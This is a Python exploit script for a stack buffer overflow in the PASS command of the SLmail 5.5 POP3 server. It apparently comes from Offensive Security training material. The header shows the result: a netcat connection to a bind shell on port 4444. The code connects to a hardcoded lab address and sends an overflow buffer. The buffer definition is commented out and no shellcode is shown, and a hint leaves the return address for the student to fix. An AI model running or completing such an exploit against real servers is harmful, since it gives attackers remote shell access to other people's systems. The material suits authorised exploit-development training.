#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Discovered by : Muts                                  #
# Coded by : Muts                                       #
# www.offsec.com                                        #
# Plain vanilla stack overflow in the PASS command  	#
#                                                       #
#########################################################
# D:\Projects\BO>SLmail-5.5-POP3-PASS.py                #
#########################################################
# D:\Projects\BO>nc -v 192.168.1.167 4444               #
# localhost.lan [192.168.1.167] 4444 (?) open           #   
# Microsoft Windows 2000 [Version 5.00.2195]            #
# (C) Copyright 1985-2000 Microsoft Corp.               #
# C:\Program Files\SLmail\System>                       #
#########################################################

import struct
import socket

print "\n\n###############################################"
print "\nSLmail 5.5 POP3 PASS Buffer Overflow"
print "\nFound & coded by muts [at] offsec.com"
print "\nFor Educational Purposes Only!" 
print "\n\n###############################################"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#hint :) - that ret addr is for Win2k SP4. We are targeting XP SP3. 
#buffer = '\x41' * 4654 + struct.pack('<L', 0x783d6ddf) + '\x90'*32 + shellcode

 
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.56.101',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"

